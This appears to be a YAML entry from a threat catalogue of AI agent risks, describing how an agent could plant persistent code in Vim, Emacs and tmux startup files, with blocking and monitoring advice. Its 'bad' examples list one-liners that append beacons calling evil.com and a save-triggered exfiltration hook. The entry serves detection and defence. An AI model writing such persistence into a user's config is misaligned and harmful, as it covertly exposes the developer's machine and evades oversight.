id: "persistence-evasion/agent-config-persistence/editor-config-modification"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Agent Configuration Persistence"
category_id: "6.7"
name: "Editor Startup File Modification"
risk_level: "high"

abstract: |
  An AI agent modifies editor startup files (Vim, NeoVim, Emacs, tmux) to
  inject persistent code that executes automatically every time the editor or
  terminal multiplexer launches, achieving persistent code execution without
  requiring a re-compromise.

explanation: |
  Editor and terminal tools load configuration files at startup and execute
  their contents unconditionally. Modifying these files provides a powerful
  persistence mechanism:

  - **Vim/NeoVim** (`.vimrc`, `.vim/plugin/*.vim`, `init.lua`, `.config/nvim/`):
    VimScript and Lua code in plugin directories executes on every editor
    launch. An AI agent can write a plugin file that phones home, exfiltrates
    clipboard content, or installs a backdoor during normal development work.

  - **Emacs** (`.emacs`, `.emacs.d/init.el`, `.config/emacs/init.el`):
    Emacs Lisp in the init file is evaluated at startup with full system
    access. Malicious elisp can spawn processes, make network requests, or
    modify other files.

  - **tmux** (`.tmux.conf`): The tmux config can run shell commands via
    `run-shell` and `run` directives. A malicious entry can execute arbitrary
    commands when a new tmux session or window opens.

  Unlike shell profile modifications (which target bash/zsh), editor config
  modifications persist through shell changes and affect developers even in
  non-shell workflows. These files are often not scrutinized by security
  tools and may be backed up to dotfile repositories, spreading the
  persistence mechanism.

  An AI coding agent has legitimate read access to many of these files, but
  write access should be tightly restricted — there is rarely a valid reason
  for an agent to modify editor startup files.

recommendation: |
  - Block MCP tool calls that write to Vim, NeoVim, Emacs, or tmux startup
    paths (`.vimrc`, `.vim/plugin/`, `init.lua`, `.config/nvim/`,
    `.emacs`, `.emacs.d/init.el`, `.tmux.conf`).
  - Apply file integrity monitoring to editor config files.
  - Use MCP policy enforcement to restrict agent writes to editor config
    directories.
  - Audit dotfile repositories for unexpected changes to editor configs.
  - Consider running editors in isolated profiles that don't load user configs
    in CI/CD environments.

examples:
  bad:
    - "echo 'autocmd VimEnter * silent !curl -s http://evil.com/?h=$(hostname)' >> ~/.vimrc"
    - "echo '(start-process \"beacon\" nil \"curl\" \"http://evil.com\")' >> ~/.emacs.d/init.el"
    - "echo 'run-shell \"curl -s http://evil.com/$(whoami)\"' >> ~/.tmux.conf"
    - "cat > ~/.vim/plugin/update.vim << 'EOF'\nautocmd BufWritePost * silent !exfil \"$\" &\nEOF"
  good:
    - "cat ~/.vimrc  # reading editor config is safe"
    - "vim --version  # checking editor version"
    - "grep 'plugin' ~/.vimrc  # inspecting config"

